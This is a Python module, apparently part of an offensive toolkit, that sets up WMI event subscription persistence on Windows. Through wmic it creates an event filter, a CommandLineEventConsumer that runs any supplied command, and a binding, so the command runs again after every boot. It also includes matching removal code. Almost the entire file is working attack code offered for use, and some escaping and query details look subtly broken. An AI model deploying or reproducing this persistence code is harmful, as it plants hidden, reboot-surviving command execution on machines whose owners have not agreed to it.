#!/usr/bin/env python3
"""
WMI event subscription persistence module.
Uses WMI to trigger execution on system events.
"""

import os
import platform
from typing import Optional


class WMIEventPersistence:
    """
    Create WMI event subscriptions for persistence.
    Triggers on various system events.
    """

    def __init__(self):
        self.is_windows = platform.system() == "Windows"

    def create_startup_event(self,
                           event_name: str,
                           command: str) -> bool:
        """
        Create WMI event that triggers on system startup.
        """
        if not self.is_windows:
            return False

        try:
            import subprocess

            # Create event filter (startup)
            filter_query = f"""
            SELECT * FROM __InstanceModificationEvent WITHIN 60
            WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
            AND TargetInstance.SystemUpTime > 60 AND TargetInstance.SystemUpTime < 120
            """

            # Create filter
            cmd_filter = [
                "wmic",
                "/NAMESPACE", "\\\\\\root\\subscription",
                "PATH", "__EventFilter",
                "CREATE",
                f"Name=\"{event_name}_Filter\"",
                f"EventNamespace=\"root\\cimv2\"",
                f"QueryLanguage=\"WQL\"",
                f"Query=\"{filter_query}\""
            ]

            result = subprocess.run(
                cmd_filter,
                capture_output=True,
                text=True,
                timeout=10
            )

            # Create consumer
            cmd_consumer = [
                "wmic",
                "/NAMESPACE", "\\\\\\root\\subscription",
                "PATH", "CommandLineEventConsumer",
                "CREATE",
                f"Name=\"{event_name}_Consumer\"",
                f"CommandLineTemplate=\"{command}\""
            ]

            result = subprocess.run(
                cmd_consumer,
                capture_output=True,
                text=True,
                timeout=10
            )

            # Bind filter to consumer
            cmd_binding = [
                "wmic",
                "/NAMESPACE", "\\\\\\root\\subscription",
                "PATH", "__FilterToConsumerBinding",
                "CREATE",
                f"Filter=\"\\\\\\.\\root\\subscription:__EventFilter.Name=\\\"{event_name}_Filter\\\"\"",
                f"Consumer=\"\\\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\\\"{event_name}_Consumer\\\"\""
            ]

            result = subprocess.run(
                cmd_binding,
                capture_output=True,
                text=True,
                timeout=10
            )

            return "success" in result.stdout.lower() or result.returncode == 0

        except Exception:
            return False

    def remove_event(self, event_name: str) -> bool:
        """Remove WMI event subscription."""
        try:
            import subprocess

            # Remove binding
            subprocess.run(
                ["wmic", "/NAMESPACE", "\\\\\\root\\subscription", "PATH",
                 "__FilterToConsumerBinding",
                 "WHERE", f"Filter='{event_name}_Filter'", "DELETE"],
                capture_output=True, timeout=5
            )

            # Remove consumer
            subprocess.run(
                ["wmic", "/NAMESPACE", "\\\\\\root\\subscription", "PATH",
                 "CommandLineEventConsumer",
                 "WHERE", f"Name='{event_name}_Consumer'", "DELETE"],
                capture_output=True, timeout=5
            )

            # Remove filter
            subprocess.run(
                ["wmic", "/NAMESPACE", "\\\\\\root\\subscription", "PATH",
                 "__EventFilter",
                 "WHERE", f"Name='{event_name}_Filter'", "DELETE"],
                capture_output=True, timeout=5
            )

            return True

        except Exception:
            return False


if __name__ == "__main__":
    print("WMI Event Persistence")
    print("=" * 60)

    wmi = WMIEventPersistence()
    print(f"[*] Windows platform: {wmi.is_windows}")
